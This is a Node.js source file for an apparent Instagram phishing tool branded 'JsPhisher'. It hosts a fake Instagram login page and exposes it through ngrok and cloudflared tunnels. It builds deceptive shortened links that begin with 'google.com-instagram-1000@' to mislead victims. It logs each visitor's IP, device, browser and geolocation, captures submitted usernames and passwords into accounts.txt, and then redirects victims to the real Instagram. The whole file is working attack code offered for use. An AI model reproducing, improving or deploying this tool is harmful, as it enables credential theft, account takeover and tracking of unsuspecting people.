"use strict";
const express = require("express");
const bodyParser = require("body-parser");
const geoip = require("geoip-lite");
const chalk = require("chalk");
const agentParser = require("ua-parser-js");
const axios = require("axios").default;
const app = express();
const port = process.env.PORT || process.env.NODE_PORT || 6969;
const ngrok = require("ngrok");
const short = require("./short");
const path = require("path");
const fs = require("fs");

const VERSION = "1.0";
const logAsk = chalk.greenBright`[{whiteBright ?}]`;
const logSuccess = chalk.yellowBright`[{whiteBright √}]`;
const logError = chalk.blueBright`[{whiteBright !}]`;
const logInfo = chalk.yellowBright`[{whiteBright +}]`;
const logInfo2 = chalk.greenBright`[{whiteBright •}]`;

const logLogo =
	chalk.red`       _     _____  _     _     _               \n` +
	chalk.cyan`      | |   |  __ \\| |   (_)   | |              \n` +
	chalk.yellow`      | |___| |__) | |__  _ ___| |__   ___ _ __ \n` +
	chalk.blue`  _   | / __|  ___/| '_ \\| / __| '_ \\ / _ \\ '__|\n` +
	chalk.red` | |__| \\__ \\ |    | | | | \\__ \\ | | |  __/ |   \n` +
	chalk.yellow`  \\____/|___/_|    |_| |_|_|___/_| |_|\\___|_|\n` +
	chalk.cyan`				       [v${VERSION}]	  \n` +
	chalk.red`			      [By GamerboyTR]	  \n`;

console.clear();
console.log(logLogo);
const loggedIps = [];

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "util", "instagram")));

console.log(chalk.magenta`${logInfo2} Initializing local server at localhost:${port}...\n`);

const botDetecter = /(Discordbot|bitlybot|facebookexternalhit)/gi;

(async () => {
	await new Promise(r =>
		app.listen(port, _ => {
			console.log(chalk.cyan`${logInfo} Local server has started successfully!\n`);
			r();
		})
	);
	console.log(chalk.magenta`${logInfo2} Initializing tunnelers at same address...\n`);
	const ngrokSw = await ngrok.connect(port).catch(console.error);
	const shortNgrok = await short(ngrokSw).catch(console.error);
	const cloudflared = require("child_process").spawn("util\\cloudflared", ["tunnel", "--url", `http://localhost:${port}`]);
	let cfUrl;
	let cfShowed = false;
	let cfReady = false;
	cloudflared.stderr.on("data", async data => {
		if (data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/)) cfUrl = data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/);
		cfReady = !!data.toString().match(/Connection (.*) registered/);
		if (cfReady && !cfShowed) {
			cfShowed = true;
			const shortCf = await short(cfUrl[0]).catch(console.error);
			console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
			console.log(chalk.magenta`${logInfo2} URL 1 > {yellowBright ${cfUrl[0]}}\n`);
			console.log(chalk.magenta`${logInfo2} URL 2 > {yellowBright ${shortCf.split("/")[0] + "//google.com-instagram-1000@" + shortCf.split("/").slice(2).join("/")}}\n\n`);
			console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
			console.log(chalk.magenta`${logInfo2} URL 3 > {yellowBright ${ngrokSw}}\n`);
			console.log(chalk.magenta`${logInfo2} URL 4 > {yellowBright ${shortNgrok.split("/")[0] + "//google.com-instagram-1000@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
			console.log(chalk.cyan`${logInfo} Waiting for ip info... {cyanBright Press {red Ctrl+C} to exit}`);
		}
	});
})();

app.all("/", async (req, res) => {
	const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
	const userAgent = req.headers["user-agent"];
	const ua = agentParser(userAgent);
	const referer = req.headers?.referer;
	const location = geoip.lookup(ip);
	const { data: request } = await axios.get(`https://ipwhois.app/json/${ip}`).catch(console.error);
	res.redirect("login");
	if (ip !== "::1" && !botDetecter.test(userAgent) && !loggedIps.includes(ip) && request.type && location?.city) {
		console.clear();
		console.log(logLogo);
		console.log(chalk.greenBright`${logSuccess} Victim IP found!\n`);

		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} IP                   :  ${ip}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} IP Type              :  ${request.type}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} User OS              :  ${ua.os?.name ? `${ua.os.name} ${ua.os.version}` : "Unknown"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Browser              :  ${ua.browser.name ?? "Unknown"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Version              :  ${ua.browser.version ?? "Unknown"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Location             :  ${request?.city ?? "Unknown"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} GeoLocation(lat, lon):  ${location.ll.join(", ")}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Curreny              :  ${request.currency_code}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Referer              :  ${referer ?? "No referer"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} UserAgent            :  ${userAgent ?? "No agent"}\n`);

		loggedIps.push(ip);
		fs.appendFileSync("./ip.txt", `${ip} - ${ua.os?.name ? `${ua.os.name} ${ua.os.version}` : "Unknown"} - ${ua.browser.name ?? "Unknown"}${" " + ua.browser.version ?? ""} - ${location?.city ?? "Unknown"} - ${location.ll.join(", ")} - ${referer ?? "No referer"}\n`);
		console.log(chalk.cyan`${logInfo} Saved in ip.txt\n`);
		console.log(chalk.cyan`${logInfo} Waiting for next... {cyanBright Press {red Ctrl+C} to exit}`);
	}
});

app.get("/login", (req, res) => {
	res.sendFile(path.join(__dirname, "util", "instagram", "login.html"));
});

app.post("/login", (req, res) => {
	const { username, password } = req.body;
	res.redirect("https://instagram.com");
	if (!username?.trim?.() || !password?.trim?.()) return;
	console.log(chalk.greenBright`${logSuccess} Victim login info found!\n`);

	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Instagram Username:  ${username}`);
	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Instagram Password:  ${password}\n`);

	fs.appendFileSync("./accounts.txt", `${username}:${password}\n`);
	console.log(chalk.cyan`${logInfo} Saved in accounts.txt\n`);
	console.log(chalk.cyan`${logInfo} Waiting for next... {cyanBright Press {red Ctrl+C} to exit}`);
});
